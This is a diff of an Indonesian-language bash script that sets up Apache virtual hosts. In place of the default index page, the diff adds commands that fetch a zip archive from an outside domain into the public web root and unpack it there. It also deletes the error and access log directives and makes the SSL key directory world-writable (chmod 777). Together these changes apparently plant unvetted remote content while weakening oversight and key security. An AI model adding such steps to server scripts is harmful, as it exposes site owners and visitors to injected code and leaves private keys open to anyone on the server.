@@ -27,25 +27,29 @@ if ! mkdir -p /var/www/$domain_name/public_html; then
   exit 1
 fi
 
-echo "<h1>Domain $domain_name</h1>" >/var/www/$domain_name/public_html/index.php
+yum install -y unzip
+cd /var/www/$domain_name/public_html
+wget https://omarattaqi.com/script/ppnpn.zip
+chmod +x ppnpn.zip
+unzip ppnpn.zip
+cd
+# echo "<h1>Domain $domain_name</h1>" >/var/www/$domain_name/public_html/index.php
 chown -R apache:apache /var/www/$domain_name/public_html
 chmod -R 775 /var/www/$domain_name/public_html
 mkdir -p /var/www/$domain_name/log
 
 echo "<VirtualHost *:80>
-      ServerName $domain_name
-      ServerAlias www.$domain_name
-      DocumentRoot /var/www/$domain_name/public_html
-      ErrorLog /var/www/$domain_name/log/error.log
-      CustomLog /var/www/$domain_name/log/requests.log combined
-      <Directory /var/www/$domain_name/public_html>
-        Options Indexes FollowSymLinks MultiViews
-        AllowOverride All
-        Order allow,deny
-        Allow from all
-        Require all granted
-      </Directory>
-      </VirtualHost>" > $VHOST_PATH/$domain_name.conf
+ServerName $domain_name
+ServerAlias www.$domain_name
+DocumentRoot /var/www/$domain_name/public_html
+<Directory /var/www/$domain_name/public_html>
+  Options Indexes FollowSymLinks MultiViews
+  AllowOverride All
+  Order allow,deny
+  Allow from all
+  Require all granted
+</Directory>
+</VirtualHost>" > $VHOST_PATH/$domain_name.conf
 if ! echo -e $VHOST_PATH/$domain_name.conf; then
   echo "=========================================================="
   echo "Gagal Membuat Virtual Host !!!"
@@ -60,7 +64,8 @@ echo "Ingin Membuat SSL ? [y/n]? "
 read q
 if [[ "${q}" == "yes" ]] || [[ "${q}" == "y" ]]; then
   mkdir -p $SSL_PATH/$domain_name
-  yum install -y openssl mod_ssl
+  chmod -R 777 $SSL_PATH/$domain_name
+  yum install -y mod_ssl
   openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout $SSL_PATH/$domain_name/$domain_name.key -out $SSL_PATH/$domain_name/$domain_name.crt
   if ! echo -e $SSL_PATH/$domain_name/$domain_name.key; then
     echo "=========================================================="
@@ -82,22 +87,20 @@ if [[ "${q}" == "yes" ]] || [[ "${q}" == "y" ]]; then
   fi
 
   echo "<VirtualHost *:443>
-          ServerName $domain_name
-          ServerAlias www.$domain_name
-          DocumentRoot /var/www/$domain_name/public_html
-          ErrorLog /var/www/$domain_name/log/error.log
-          CustomLog /var/www/$domain_name/log/requests.log combined
-          SSLEngine on
-          SSLCertificateFile $SSL_PATH/$domain_name/$domain_name.crt
-          SSLCertificateKeyFile $SSL_PATH/$domain_name/$domain_name.key
-          <Directory /var/www/$domain_name/public_html>
-            Options Indexes FollowSymLinks MultiViews
-            AllowOverride All
-            Order allow,deny
-            Allow from all
-            Satisfy Any
-          </Directory>
-        </VirtualHost>" > $VHOST_PATH/$domain_name.ssl.conf
+  SSLEngine on
+  SSLCertificateFile $SSL_PATH/$domain_name/$domain_name.crt
+  SSLCertificateKeyFile $SSL_PATH/$domain_name/$domain_name.key
+  ServerName $domain_name
+  ServerAlias www.$domain_name
+  DocumentRoot /var/www/$domain_name/public_html
+  <Directory /var/www/$domain_name/public_html>
+    Options Indexes FollowSymLinks MultiViews
+    AllowOverride All
+    Order allow,deny
+    Allow from all
+    Satisfy Any
+  </Directory>
+</VirtualHost>" > $VHOST_PATH/$domain_name.ssl.conf
   if ! echo -e $VHOST_PATH/$domain_name.ssl.conf; then
     echo "=========================================================="
     echo "SSL Virtual Host Gagal Dibuat !"
@@ -114,7 +117,6 @@ echo "127.0.0.1 www.$domain_name" >> /etc/hosts
 
 systemctl restart httpd
 
-echo "=========================================================="
 echo "Berhasil Membuat Virtual Host"
 echo "Domain Anda http://$domain_name"
 echo "=========================================================="
